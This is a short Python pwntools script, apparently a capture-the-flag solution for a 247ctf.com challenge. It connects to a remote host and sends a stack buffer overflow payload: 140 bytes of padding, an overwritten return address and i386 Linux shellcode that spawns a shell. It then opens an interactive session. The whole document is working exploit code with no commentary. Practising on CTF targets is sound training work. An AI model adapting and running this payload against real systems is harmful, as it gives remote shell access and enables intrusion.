
```python
#!/usr/bin/env python3
from pwn import *

target = remote("e183b2a3a96bf008.247ctf.com", 50183)
shellcode = shellcraft.i386.linux.sh()
payload = b'A' * 140
payload += p32(0x080484b3)
payload += asm(shellcode, arch='i386')
target.sendline(payload)
target.interactive()
```
